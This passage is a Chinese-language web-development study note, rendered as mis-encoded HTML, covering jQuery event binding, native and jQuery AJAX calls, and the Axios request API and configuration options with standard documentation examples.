<li>$().on(&quot;äº‹ä»¶å&quot;,äº‹ä»¶å¤„ç†å‡½æ•°)     $(&quot;#d&quot;).on(&quot;click&quot;,function(){})</li>
<li>$().bind(&quot;äº‹ä»¶å&quot;,äº‹ä»¶å¤„ç†å‡½æ•°)   $(&quot;#d&quot;).bind(&quot;click&quot;,function(){})
<ul>
<li>jsä¸­çš„æ˜¯ä¸€æ¬¡æ·»åŠ ï¼Œå¤šæ¬¡æ·»åŠ æ—¶è¦†ç›–çš„æ•ˆæœ</li>
<li>jQueryæ˜¯è¿½åŠ çš„æ•ˆæœï¼Œå¯ä»¥å®ç°ç»™ä¸€ä¸ªäº‹ä»¶æ·»åŠ ä¸åŒçš„ç›‘å¬å‡½æ•°ã€‚</li>
</ul>
</li>
<li>$().one(&quot;äº‹ä»¶å&quot;,äº‹ä»¶å¤„ç†å‡½æ•°)</li>
<li>$().trigger(&quot;äº‹ä»¶å&quot;,äº‹ä»¶å¤„ç†å‡½æ•°)</li>
</ul>
<p><strong>é¡µé¢è½½å…¥äº‹ä»¶</strong>ï¼šå½“HTMLé¡µé¢å®ŒæˆåŠ è½½æ—¶è§¦å‘å‡½æ•°æŒ‡å®šçš„å‡½æ•°çš„æ‰§è¡Œï¼Œç±»ä¼¼onloadäº‹ä»¶</p>
<ul>
<li>$(dcoument).ready(function(){ å‡½æ•°ä½“ })</li>
<li>$(function(){ å‡½æ•°ä½“ })</li>
<li>ç‰¹ç‚¹:å¯ä»¥åŒæ—¶å£°æ˜å¤šä¸ªå‡½æ•°ï¼Œä¸ä¼šè¢«è¦†ç›–ã€‚</li>
</ul>
<h3 id="è§£é™¤äº‹ä»¶ç»‘å®š" tabindex="-1"> è§£é™¤äº‹ä»¶ç»‘å®š</h3>
<p>$().unbind(&quot;äº‹ä»¶å&quot;)</p>
<h1 id="ajax" tabindex="-1"> Ajax</h1>
<h2 id="ajax-ç®€ä»‹" tabindex="-1"> Ajax ç®€ä»‹</h2>
<p>AJAX = Asynchronous JavaScript and XMLï¼ˆå¼‚æ­¥çš„ JavaScript å’Œ XMLï¼‰ã€‚</p>
<p>AJAX æœ€å¤§çš„ä¼˜ç‚¹æ˜¯åœ¨ä¸é‡æ–°åŠ è½½æ•´ä¸ªé¡µé¢çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®å¹¶æ›´æ–°éƒ¨åˆ†ç½‘é¡µå†…å®¹ã€‚</p>
<p>Ajaxæœ¬èº«å±äºjså†…æ ¸ä¸­çš„ä¸€éƒ¨åˆ†ï¼ŒjQueryæ˜¯jsçš„ä¸€ä¸ªæ¡†æ¶ï¼Œæ˜¯å¯¹jsçš„å°è£…ï¼Œå› æ­¤jQueryä¸­ä¹Ÿç»´æŠ¤ç€Ajaxçš„å†…å®¹ã€‚</p>
<h2 id="ajax-å·¥ä½œåŸç†" tabindex="-1"> Ajax å·¥ä½œåŸç†</h2>
<p>é¡µé¢å‘èµ·è¯·æ±‚ï¼Œä¼šå°†è¯·æ±‚å‘é€ç»™æµè§ˆå™¨å†…æ ¸ä¸­çš„Ajaxå¼•æ“ï¼ŒAjaxå¼•æ“ä¼šæäº¤è¯·æ±‚åˆ°æœåŠ¡å™¨ç«¯ï¼Œåœ¨è¿™æ®µæ—¶é—´é‡Œï¼Œå®¢æˆ·ç«¯å¯ä»¥è¿›è¡Œä»»æ„æ“ä½œï¼ŒçŸ¥é“æœåŠ¡å™¨ç«¯å°†æ•°æ®è¿”å›ç»™Ajaxå¼•æ“åï¼Œä¼šè§¦å‘ä½ è®¾ç½®çš„äº‹ä»¶ï¼Œä»è€Œæ‰§è¡Œè‡ªå®šä¹‰çš„jsé€»è¾‘ä»£ç å®ŒæˆæŸç§é¡µé¢åŠŸèƒ½ã€‚</p>
<p>ajaxæ˜¯å‰ç«¯çš„æŠ€æœ¯ï¼Œç”±æµè§ˆå™¨è¿›è¡Œè§£ææ‰§è¡Œã€‚</p>
<p><img src="@source/assets/cs-note/preface/basic/ajax-yl.png" alt="" loading="lazy"></p>
<h2 id="ajax-ä½¿ç”¨" tabindex="-1"> Ajax ä½¿ç”¨</h2>
<ul>
<li>åˆ›å»ºå¼‚æ­¥å¯¹è±¡ã€‚å³ XMLHttpRequest å¯¹è±¡ã€‚</li>
<li>è®¾ç½®è¯·æ±‚çš„å‚æ•°ã€‚åŒ…æ‹¬ï¼šè¯·æ±‚çš„æ–¹æ³•ã€è¯·æ±‚çš„urlã€‚</li>
<li>å‘é€è¯·æ±‚ã€‚</li>
<li>æ³¨å†Œäº‹ä»¶ã€‚ onreadystatechangeäº‹ä»¶ï¼ŒçŠ¶æ€æ”¹å˜æ—¶å°±ä¼šè°ƒç”¨ã€‚</li>
<li>è·å–è¿”å›çš„æ•°æ®ã€‚
<ul>
<li>æ™®é€šæ–‡æœ¬ï¼šåå°åœ¨æ¥æ”¶åˆ°ajaxè¯·æ±‚åï¼Œå¤„ç†åç›´æ¥å“åº”æ™®é€šå­—ç¬¦ä¸²ç»™ajax</li>
<li>jsonæ•°æ®ï¼šåå°åœ¨æ¥æ”¶åˆ°ajaxè¯·æ±‚åï¼Œå¤„ç†åå“åº”jsonæ ¼å¼çš„å­—ç¬¦ä¸²ç»™ajaxï¼Œajaxå¤„ç†ä»£ç ä¸­ä½¿ç”¨eval()æ–¹æ³•å°†jsonæ•°æ®è½¬æ¢ä¸ºjså¯¹çš„å¯¹è±¡ï¼Œå°†å¯¹è±¡ä¸­çš„æ•°æ®é€šè¿‡jsçš„domæ“ä½œæ˜¾ç¤ºåˆ°é¡µé¢ä¸­ã€‚</li>
<li>xmlï¼šåå°åœ¨æ¥æ”¶åˆ°ajaxè¯·æ±‚åï¼Œå¤„ç†åå“åº”xmlæ ¼å¼çš„å­—ç¬¦ä¸²ç»™ajaxã€‚å‰å°ä½¿ç”¨ajax.responseXMLè¿›è¡Œæ•°æ®æ¥æ”¶ï¼Œè¿”å›çš„æ˜¯xmlæ–‡æ¡£å¯¹è±¡(document)ã€‚ä½¿ç”¨documentå¯¹è±¡å°†xmlä¸­å–å‡ºå¹¶æ˜¾ç¤ºåˆ°é¡µé¢ä¸­å³å¯ã€‚æ³¨æ„ï¼šåå°çš„å“åº”æ•°æ®æ ¼å¼å¿…é¡»è®¾ç½®æˆxmlæ ¼å¼ï¼š</li>
</ul>
</li>
</ul>
<h3 id="åŸç”Ÿ-ajaxä½¿ç”¨" tabindex="-1"> åŸç”Ÿ Ajaxä½¿ç”¨</h3>
<ul>
<li>åˆ›å»ºajaxå¼•æ“å¯¹è±¡</li>
<li>è¦†å†™onreadystatechangeå‡½æ•°
<ul>
<li>åˆ¤æ–­æ•°æ®çŠ¶æ€ç </li>
<li>åˆ¤æ–­å“åº”çŠ¶æ€ç </li>
<li>è·å–å“åº”æ•°æ®</li>
<li>å¤„ç†å“åº”ä¿¡æ¯</li>
</ul>
</li>
<li>åˆ›å»ºå¹¶å‘é€è¯·æ±‚
<ul>
<li>getè¯·æ±‚</li>
</ul>
</li>
</ul>
<div><pre><code><span>//getçš„è¯·æ±‚å®ä½“æ‹¼æ¥åœ¨URLåé¢ï¼Œï¼Ÿéš”å¼€ï¼Œé”®å€¼å¯¹</span>
ajax<span>.</span><span>open</span><span>(</span><span>"get"</span><span>,</span><span>"url"</span><span>)</span><span>;</span>
ajax<span>.</span><span>send</span><span>(</span><span>null</span><span>)</span><span>;</span>
</code></pre></div><ul>
<li>postè¯·æ±‚</li>
</ul>
<div><pre><code><span>//æœ‰å•ç‹¬çš„è¯·æ±‚å®ä½“</span>
ajax<span>.</span><span>open</span><span>(</span><span>"post"</span><span>,</span> <span>"url"</span><span>)</span><span>;</span>
ajax<span>.</span><span>setRequestHeader</span><span>(</span><span>"Content-Type"</span><span>,</span><span>"application/x-www-form-urlencoded"</span><span>)</span><span>;</span>
ajax<span>.</span><span>send</span><span>(</span><span>"name=å¼ ä¸‰&amp;pwd=123"</span><span>)</span><span>;</span>
</code></pre></div><ul>
<li>ajaxçš„çŠ¶æ€ç 
<ul>
<li>0 è¡¨ç¤ºXMLHttpRequestå·²å»ºç«‹ï¼Œä½†è¿˜æœªåˆå§‹åŒ–ï¼Œè¿™æ—¶å°šæœªè°ƒç”¨openæ–¹æ³•</li>
<li>1 è¡¨ç¤ºopenæ–¹æ³•å·²ç»è°ƒç”¨ï¼Œä½†æœªè°ƒç”¨sendæ–¹æ³•ï¼ˆå·²åˆ›å»ºï¼Œæœªå‘é€ï¼‰</li>
<li>2 è¡¨ç¤ºsendæ–¹æ³•å·²ç»è°ƒç”¨ï¼Œå…¶ä»–æ•°æ®æœªçŸ¥</li>
<li>3 è¡¨ç¤ºè¯·æ±‚å·²ç»æˆåŠŸå‘é€ï¼Œæ­£åœ¨æ¥å—æ•°æ®</li>
<li>4 è¡¨ç¤ºæ•°æ®å·²ç»æˆåŠŸæ¥æ”¶ã€‚</li>
</ul>
</li>
<li>ajaxçš„å¼‚æ­¥å’ŒåŒæ­¥:ajax.open(method,urL,async)</li>
<li>å°è£…ï¼šç›¸åŒçš„ä¿ç•™ï¼Œä¸åŒçš„ä¼ å‚ã€‚æœ€ç»ˆå°è£…æˆä¸€ä¸ªjsæ–‡ä»¶ã€‚</li>
</ul>
<h3 id="jqueryä¸­çš„ajax" tabindex="-1"> JQueryä¸­çš„Ajax</h3>
<p>ä¸Ajaxæ“ä½œç›¸å…³çš„jQueryæ–¹æ³•å¾ˆå¤šç§ï¼Œä½†å¼€å‘ä¸­å¸¸ç”¨çš„æœ‰ä¸‰ç§ï¼š</p>
<ul>
<li>$.get(url, [data], [callback], [type]);
<ul>
<li>String urlï¼šå¾…è½½å…¥é¡µé¢çš„urlåœ°å€</li>
<li>Map dataï¼ˆå¯é€‰ï¼‰ï¼šå¾…å‘é€key/valueå‚æ•°</li>
<li>Function callbackï¼ˆå¯é€‰ï¼‰ï¼šè½½å…¥æˆåŠŸæ—¶çš„å›è°ƒå‡½æ•°</li>
<li>String typeï¼ˆå¯é€‰ï¼‰ï¼šè¿”å›å†…å®¹æ ¼å¼ï¼Œxmlï¼Œhtmlï¼Œscriptï¼Œjsonï¼Œtextï¼Œ_default</li>
</ul>
</li>
<li>$.post(url, [data], [callback], [type]);</li>
<li>$.ajax({option1:value1,option2:value2});</li>
</ul>
<p><strong>jQueryçš„ajaxæ–¹æ³•</strong></p>
<p>å¸¸ç”¨çš„optionå¦‚ä¸‹ï¼š</p>
<ul>
<li>asyncï¼šæ˜¯å¦å¼‚æ­¥ï¼Œé»˜è®¤æ˜¯trueï¼Œä»£è¡¨å¼‚æ­¥</li>
<li>dataï¼šå‘é€åˆ°æœåŠ¡å™¨çš„å‚æ•°ï¼Œå»ºè®®ä½¿ç”¨jsonæ ¼å¼</li>
<li>dataTypeï¼šæœåŠ¡å™¨ç«¯è¿”å›çš„æ•°æ®ç±»å‹ï¼Œå¸¸ç”¨textå’Œjson</li>
<li>successï¼šæˆåŠŸå“åº”æ‰§è¡Œçš„å‡½æ•°ï¼Œå¯¹åº”çš„ç±»å‹æ˜¯functionç±»å‹</li>
<li>typeï¼šè¯·æ±‚æ–¹å¼ï¼ŒGET/POST</li>
<li>urlï¼šè¯·æ±‚æœåŠ¡å™¨ç«¯åœ°å€</li>
</ul>
<div><pre><code><span>$</span><span>(</span><span>"a"</span><span>)</span><span>.</span><span>click</span><span>(</span><span>function</span><span>(</span><span>)</span><span>{</span> 
    $<span>.</span><span>ajax</span><span>(</span><span>{</span> 
        <span>url</span><span>:</span><span>"http://www.microsoft.com"</span><span>,</span> <span>//è¯·æ±‚çš„urlåœ°å€</span>
        <span>data</span><span>:</span><span>{</span><span>"key"</span><span>:</span><span>"value"</span><span>}</span><span>,</span>   <span>//å‚æ•°å€¼</span>
        <span>async</span><span>:</span><span>true</span><span>,</span>             <span>//è¯·æ±‚æ˜¯å¦å¼‚æ­¥ï¼Œé»˜è®¤ä¸ºå¼‚æ­¥ï¼Œè¿™ä¹Ÿæ˜¯ajaxé‡è¦ç‰¹æ€§</span>
        <span>dataType</span><span>:</span><span>'json'</span><span>,</span>        <span>//è¿”å›æ ¼å¼ä¸ºjson</span>
        <span>type</span><span>:</span><span>'POST'</span><span>,</span>    <span>//è¯·æ±‚æ–¹å¼</span>
        <span>beforeSend</span><span>:</span><span>function</span><span>(</span><span>)</span><span>{</span>
            <span>//è¯·æ±‚å‰çš„å¤„ç†</span>
        <span>}</span><span>,</span>
        <span>success</span><span>:</span><span>function</span><span>(</span><span>data</span><span>)</span><span>{</span>
            <span>alert</span><span>(</span><span>"è¯·æ±‚æˆåŠŸ"</span><span>+</span>data<span>)</span><span>;</span> <span>//è¯·æ±‚æˆåŠŸæ—¶å¤„ç†</span>
        <span>}</span><span>,</span>
        <span>error</span><span>:</span><span>function</span><span>(</span><span>)</span><span>{</span>
            <span>alert</span><span>(</span><span>"è¯·æ±‚å‡ºé”™."</span><span>)</span><span>;</span> <span>//è¯·æ±‚å‡ºé”™å¤„ç†</span>
        <span>}</span><span>,</span> 
        <span>complete</span><span>:</span><span>function</span><span>(</span><span>)</span><span>{</span>
            <span>//è¯·æ±‚å®Œæˆçš„å¤„ç†</span>
        <span>}</span>
    <span>}</span><span>)</span><span>;</span> 
    <span>return</span> <span>false</span><span>;</span>
<span>}</span><span>)</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><p>jquery ä¸­ ajax åˆ†ç±»</p>
<ul>
<li>ç¬¬ä¸€å±‚ $.ajax({ å±æ€§å:å€¼,å±æ€§å:å€¼})
<ul>
<li>æ˜¯ jquery ä¸­åŠŸèƒ½æœ€å…¨çš„ï¼Œä»£ç å†™èµ·æ¥ç›¸å¯¹æœ€éº»çƒ¦çš„.</li>
</ul>
</li>
<li>ç¬¬äºŒå±‚(ç®€åŒ–$.ajax)
<ul>
<li>$.get(url,data,success,dataType)</li>
<li>$.post(url,data,success,dataType)</li>
</ul>
</li>
<li>ç¬¬ä¸‰å±‚(ç®€åŒ–$.get())
<ul>
<li>$.getJSON(url,data,success) ç›¸å½“äºè®¾ç½® $.get ä¸­dataType=&quot;json&quot;</li>
<li>$.getScript(url,data,success) ç›¸å½“äºè®¾ç½® $.get ä¸­dataType=&quot;script&quot;</li>
</ul>
</li>
</ul>
<p>å¦‚æœæœåŠ¡å™¨è¿”å›æ•°æ®æ˜¯ä»è¡¨ä¸­å–å‡º.ä¸ºäº†æ–¹ä¾¿å®¢æˆ·ç«¯æ“ä½œè¿”å›çš„æ•°æ®,æœåŠ¡å™¨ç«¯è¿”å›çš„æ•°æ®è®¾ç½®æˆ json,å®¢æˆ·ç«¯æŠŠ json å½“ä½œå¯¹è±¡æˆ–æ•°ç»„æ“ä½œ.</p>
<p>json:æ•°æ®æ ¼å¼.</p>
<ul>
<li>JsonObject:json å¯¹è±¡,ç†è§£æˆ java ä¸­å¯¹è±¡ {&quot;key&quot;:value,'key&quot;:value}</li>
<li>JsonArray:json æ•°ç»„ [{&quot;key&quot;:value,&quot;key&quot;:value},{}]</li>
</ul>
<h1 id="axios" tabindex="-1"> Axios</h1>
<h2 id="axios-ç®€ä»‹" tabindex="-1"> axios ç®€ä»‹</h2>
<p>Axios æ˜¯ä¸€ä¸ªåŸºäº promise çš„ HTTP åº“ï¼Œå¯ä»¥ç”¨åœ¨æµè§ˆå™¨å’Œ node.js ä¸­ã€‚</p>
<p>æœ¬èº«å…·æœ‰ä»¥ä¸‹<strong>ç‰¹æ€§</strong></p>
<ul>
<li>ä»æµè§ˆå™¨ä¸­åˆ›å»º XMLHttpRequest</li>
<li>ä» node.js å‘å‡º http è¯·æ±‚</li>
<li>æ”¯æŒ Promise API</li>
<li>æ‹¦æˆªè¯·æ±‚å’Œå“åº”</li>
<li>è½¬æ¢è¯·æ±‚å’Œå“åº”æ•°æ®</li>
<li>å–æ¶ˆè¯·æ±‚</li>
<li>è‡ªåŠ¨è½¬æ¢JSONæ•°æ®</li>
<li>å®¢æˆ·ç«¯æ”¯æŒé˜²æ­¢ CSRF/XSRF</li>
</ul>
<h2 id="axios-api" tabindex="-1"> axios API</h2>
<p><strong>axios(config)</strong>:å¯ä»¥é€šè¿‡å‘ axios ä¼ é€’ç›¸å…³é…ç½®æ¥åˆ›å»ºè¯·æ±‚</p>
<p><strong>axios(url[, config])</strong></p>
<div><pre><code><span>// å‘é€ POST è¯·æ±‚</span>
<span>axios</span><span>(</span><span>{</span>
  <span>method</span><span>:</span> <span>'post'</span><span>,</span>
  <span>url</span><span>:</span> <span>'/user/12345'</span><span>,</span>
  <span>data</span><span>:</span> <span>{</span>
    <span>firstName</span><span>:</span> <span>'Fred'</span><span>,</span>
    <span>lastName</span><span>:</span> <span>'Flintstone'</span>
  <span>}</span>
<span>}</span><span>)</span><span>;</span>

<span>// è·å–è¿œç«¯å›¾ç‰‡</span>
<span>axios</span><span>(</span><span>{</span>
  <span>method</span><span>:</span><span>'get'</span><span>,</span>
  <span>url</span><span>:</span><span>'http://bit.ly/2mTM3nY'</span><span>,</span>
  <span>responseType</span><span>:</span><span>'stream'</span>
<span>}</span><span>)</span>
  <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>response</span><span>)</span> <span>{</span>
  response<span>.</span>data<span>.</span><span>pipe</span><span>(</span>fs<span>.</span><span>createWriteStream</span><span>(</span><span>'ada_lovelace.jpg'</span><span>)</span><span>)</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><h3 id="è¯·æ±‚æ–¹æ³•åˆ«å" tabindex="-1"> è¯·æ±‚æ–¹æ³•åˆ«å</h3>
<ul>
<li>axios.request(config)</li>
<li>axios.get(url[, config])</li>
<li>axios.delete(url[, config])</li>
<li>axios.head(url[, config])</li>
<li>axios.options(url[, config])</li>
<li>axios.post(url[, data[, config]])</li>
<li>axios.put(url[, data[, config]])</li>
<li>axios.patch(url[, data[, config]])</li>
</ul>
<p><strong>æ³¨æ„</strong>ï¼šåœ¨ä½¿ç”¨åˆ«åæ–¹æ³•æ—¶ï¼Œ urlã€methodã€data è¿™äº›å±æ€§éƒ½ä¸å¿…åœ¨é…ç½®ä¸­æŒ‡å®šã€‚</p>
<h3 id="å¹¶å‘è¯·æ±‚" tabindex="-1"> å¹¶å‘è¯·æ±‚</h3>
<p>å¤„ç†å¹¶å‘è¯·æ±‚çš„åŠ©æ‰‹å‡½æ•°</p>
<ul>
<li>axios.all(iterable)</li>
<li>axios.spread(callback)</li>
</ul>
<h3 id="è¯·æ±‚é…ç½®" tabindex="-1"> è¯·æ±‚é…ç½®</h3>
<div><pre><code><span>{</span>
   <span>// `url` æ˜¯ç”¨äºè¯·æ±‚çš„æœåŠ¡å™¨ URL</span>
  <span>url</span><span>:</span> <span>'/user'</span><span>,</span>

  <span>// `method` æ˜¯åˆ›å»ºè¯·æ±‚æ—¶ä½¿ç”¨çš„æ–¹æ³•</span>
  <span>method</span><span>:</span> <span>'get'</span><span>,</span> <span>// default</span>

  <span>// `baseURL` å°†è‡ªåŠ¨åŠ åœ¨ `url` å‰é¢ï¼Œé™¤é `url` æ˜¯ä¸€ä¸ªç»å¯¹ URLã€‚</span>
  <span>// å®ƒå¯ä»¥é€šè¿‡è®¾ç½®ä¸€ä¸ª `baseURL` ä¾¿äºä¸º axios å®ä¾‹çš„æ–¹æ³•ä¼ é€’ç›¸å¯¹ URL</span>
  <span>baseURL</span><span>:</span> <span>'https://some-domain.com/api/'</span><span>,</span>

  <span>// `transformRequest` å…è®¸åœ¨å‘æœåŠ¡å™¨å‘é€å‰ï¼Œä¿®æ”¹è¯·æ±‚æ•°æ®</span>
  <span>// åªèƒ½ç”¨åœ¨ 'PUT', 'POST' å’Œ 'PATCH' è¿™å‡ ä¸ªè¯·æ±‚æ–¹æ³•</span>
  <span>// åé¢æ•°ç»„ä¸­çš„å‡½æ•°å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ– ArrayBufferï¼Œæˆ– Stream</span>
  <span>transformRequest</span><span>:</span> <span>[</span><span>function</span> <span>(</span><span>data<span>,</span> headers</span><span>)</span> <span>{</span>
    <span>// å¯¹ data è¿›è¡Œä»»æ„è½¬æ¢å¤„ç†</span>
    <span>return</span> data<span>;</span>
  <span>}</span><span>]</span><span>,</span>

  <span>// `transformResponse` åœ¨ä¼ é€’ç»™ then/catch å‰ï¼Œå…è®¸ä¿®æ”¹å“åº”æ•°æ®</span>
  <span>transformResponse</span><span>:</span> <span>[</span><span>function</span> <span>(</span><span>data</span><span>)</span> <span>{</span>
    <span>// å¯¹ data è¿›è¡Œä»»æ„è½¬æ¢å¤„ç†</span>
    <span>return</span> data<span>;</span>
  <span>}</span><span>]</span><span>,</span>

  <span>// `headers` æ˜¯å³å°†è¢«å‘é€çš„è‡ªå®šä¹‰è¯·æ±‚å¤´</span>
  <span>headers</span><span>:</span> <span>{</span><span>'X-Requested-With'</span><span>:</span> <span>'XMLHttpRequest'</span><span>}</span><span>,</span>

  <span>// `params` æ˜¯å³å°†ä¸è¯·æ±‚ä¸€èµ·å‘é€çš„ URL å‚æ•°</span>
  <span>// å¿…é¡»æ˜¯ä¸€ä¸ªæ— æ ¼å¼å¯¹è±¡(plain object)æˆ– URLSearchParams å¯¹è±¡</span>
  <span>params</span><span>:</span> <span>{</span>
    <span>ID</span><span>:</span> <span>12345</span>
  <span>}</span><span>,</span>

   <span>// `paramsSerializer` æ˜¯ä¸€ä¸ªè´Ÿè´£ `params` åºåˆ—åŒ–çš„å‡½æ•°</span>
  <span>// (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)</span>
  <span>paramsSerializer</span><span>:</span> <span>function</span><span>(</span><span>params</span><span>)</span> <span>{</span>
    <span>return</span> Qs<span>.</span><span>stringify</span><span>(</span>params<span>,</span> <span>{</span><span>arrayFormat</span><span>:</span> <span>'brackets'</span><span>}</span><span>)</span>
  <span>}</span><span>,</span>

  <span>// `data` æ˜¯ä½œä¸ºè¯·æ±‚ä¸»ä½“è¢«å‘é€çš„æ•°æ®</span>
  <span>// åªé€‚ç”¨äºè¿™äº›è¯·æ±‚æ–¹æ³• 'PUT', 'POST', å’Œ 'PATCH'</span>
  <span>// åœ¨æ²¡æœ‰è®¾ç½® `transformRequest` æ—¶ï¼Œå¿…é¡»æ˜¯ä»¥ä¸‹ç±»å‹ä¹‹ä¸€ï¼š</span>
  <span>// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span>
  <span>// - æµè§ˆå™¨ä¸“å±ï¼šFormData, File, Blob</span>
  <span>// - Node ä¸“å±ï¼š Stream</span>
  <span>data</span><span>:</span> <span>{</span>
    <span>firstName</span><span>:</span> <span>'Fred'</span>
  <span>}</span><span>,</span>

  <span>// `timeout` æŒ‡å®šè¯·æ±‚è¶…æ—¶çš„æ¯«ç§’æ•°(0 è¡¨ç¤ºæ— è¶…æ—¶æ—¶é—´)</span>
  <span>// å¦‚æœè¯·æ±‚è¯è´¹äº†è¶…è¿‡ `timeout` çš„æ—¶é—´ï¼Œè¯·æ±‚å°†è¢«ä¸­æ–­</span>
  <span>timeout</span><span>:</span> <span>1000</span><span>,</span>

   <span>// `withCredentials` è¡¨ç¤ºè·¨åŸŸè¯·æ±‚æ—¶æ˜¯å¦éœ€è¦ä½¿ç”¨å‡­è¯</span>
  <span>withCredentials</span><span>:</span> <span>false</span><span>,</span> <span>// default</span>

  <span>// `adapter` å…è®¸è‡ªå®šä¹‰å¤„ç†è¯·æ±‚ï¼Œä»¥ä½¿æµ‹è¯•æ›´è½»æ¾</span>
  <span>// è¿”å›ä¸€ä¸ª promise å¹¶åº”ç”¨ä¸€ä¸ªæœ‰æ•ˆçš„å“åº” (æŸ¥é˜… [response docs](#response-api)).</span>
  <span>adapter</span><span>:</span> <span>function</span> <span>(</span><span>config</span><span>)</span> <span>{</span>
    <span>/* ... */</span>
  <span>}</span><span>,</span>

 <span>// `auth` è¡¨ç¤ºåº”è¯¥ä½¿ç”¨ HTTP åŸºç¡€éªŒè¯ï¼Œå¹¶æä¾›å‡­æ®</span>
  <span>// è¿™å°†è®¾ç½®ä¸€ä¸ª `Authorization` å¤´ï¼Œè¦†å†™æ‰ç°æœ‰çš„ä»»æ„ä½¿ç”¨ `headers` è®¾ç½®çš„è‡ªå®šä¹‰ `Authorization`å¤´</span>
  <span>auth</span><span>:</span> <span>{</span>
    <span>username</span><span>:</span> <span>'janedoe'</span><span>,</span>
    <span>password</span><span>:</span> <span>'s00pers3cret'</span>
  <span>}</span><span>,</span>

   <span>// `responseType` è¡¨ç¤ºæœåŠ¡å™¨å“åº”çš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥æ˜¯ 'arraybuffer', 'blob', 'document', 'json', 'text', 'stream'</span>
  <span>responseType</span><span>:</span> <span>'json'</span><span>,</span> <span>// default</span>

  <span>// `responseEncoding` indicates encoding to use for decoding responses</span>
  <span>// Note: Ignored for `responseType` of 'stream' or client-side requests</span>
  <span>responseEncoding</span><span>:</span> <span>'utf8'</span><span>,</span> <span>// default</span>

   <span>// `xsrfCookieName` æ˜¯ç”¨ä½œ xsrf token çš„å€¼çš„cookieçš„åç§°</span>
  <span>xsrfCookieName</span><span>:</span> <span>'XSRF-TOKEN'</span><span>,</span> <span>// default</span>

  <span>// `xsrfHeaderName` is the name of the http header that carries the xsrf token value</span>
  <span>xsrfHeaderName</span><span>:</span> <span>'X-XSRF-TOKEN'</span><span>,</span> <span>// default</span>

   <span>// `onUploadProgress` å…è®¸ä¸ºä¸Šä¼ å¤„ç†è¿›åº¦äº‹ä»¶</span>
  <span>onUploadProgress</span><span>:</span> <span>function</span> <span>(</span><span>progressEvent</span><span>)</span> <span>{</span>
    <span>// Do whatever you want with the native progress event</span>
  <span>}</span><span>,</span>

  <span>// `onDownloadProgress` å…è®¸ä¸ºä¸‹è½½å¤„ç†è¿›åº¦äº‹ä»¶</span>
  <span>onDownloadProgress</span><span>:</span> <span>function</span> <span>(</span><span>progressEvent</span><span>)</span> <span>{</span>
    <span>// å¯¹åŸç”Ÿè¿›åº¦äº‹ä»¶çš„å¤„ç†</span>
  <span>}</span><span>,</span>

   <span>// `maxContentLength` å®šä¹‰å…è®¸çš„å“åº”å†…å®¹çš„æœ€å¤§å°ºå¯¸</span>
  <span>maxContentLength</span><span>:</span> <span>2000</span><span>,</span>

  <span>// `validateStatus` å®šä¹‰å¯¹äºç»™å®šçš„HTTP å“åº”çŠ¶æ€ç æ˜¯ resolve æˆ– reject  promise ã€‚å¦‚æœ `validateStatus` è¿”å› `true` (æˆ–è€…è®¾ç½®ä¸º `null` æˆ– `undefined`)ï¼Œpromise å°†è¢« resolve; å¦åˆ™ï¼Œpromise å°†è¢« rejecte</span>
  <span>validateStatus</span><span>:</span> <span>function</span> <span>(</span><span>status</span><span>)</span> <span>{</span>
    <span>return</span> status <span>>=</span> <span>200</span> <span>&amp;&amp;</span> status <span>&lt;</span> <span>300</span><span>;</span> <span>// default</span>
  <span>}</span><span>,</span>

  <span>// `maxRedirects` å®šä¹‰åœ¨ node.js ä¸­ follow çš„æœ€å¤§é‡å®šå‘æ•°ç›®</span>
  <span>// å¦‚æœè®¾ç½®ä¸º0ï¼Œå°†ä¸ä¼š follow ä»»ä½•é‡å®šå‘</span>
  <span>maxRedirects</span><span>:</span> <span>5</span><span>,</span> <span>// default</span>

  <span>// `socketPath` defines a UNIX Socket to be used in node.js.</span>
  <span>// e.g. '/var/run/docker.sock' to send requests to the docker daemon.</span>
  <span>// Only either `socketPath` or `proxy` can be specified.</span>
  <span>// If both are specified, `socketPath` is used.</span>
  <span>socketPath</span><span>:</span> <span>null</span><span>,</span> <span>// default</span>

  <span>// `httpAgent` å’Œ `httpsAgent` åˆ†åˆ«åœ¨ node.js ä¸­ç”¨äºå®šä¹‰åœ¨æ‰§è¡Œ http å’Œ https æ—¶ä½¿ç”¨çš„è‡ªå®šä¹‰ä»£ç†ã€‚å…è®¸åƒè¿™æ ·é…ç½®é€‰é¡¹ï¼š</span>
  <span>// `keepAlive` é»˜è®¤æ²¡æœ‰å¯ç”¨</span>
  <span>httpAgent</span><span>:</span> <span>new</span> <span>http<span>.</span>Agent</span><span>(</span><span>{</span> <span>keepAlive</span><span>:</span> <span>true</span> <span>}</span><span>)</span><span>,</span>
  <span>httpsAgent</span><span>:</span> <span>new</span> <span>https<span>.</span>Agent</span><span>(</span><span>{</span> <span>keepAlive</span><span>:</span> <span>true</span> <span>}</span><span>)</span><span>,</span>

  <span>// 'proxy' å®šä¹‰ä»£ç†æœåŠ¡å™¨çš„ä¸»æœºåç§°å’Œç«¯å£</span>
  <span>// `auth` è¡¨ç¤º HTTP åŸºç¡€éªŒè¯åº”å½“ç”¨äºè¿æ¥ä»£ç†ï¼Œå¹¶æä¾›å‡­æ®</span>
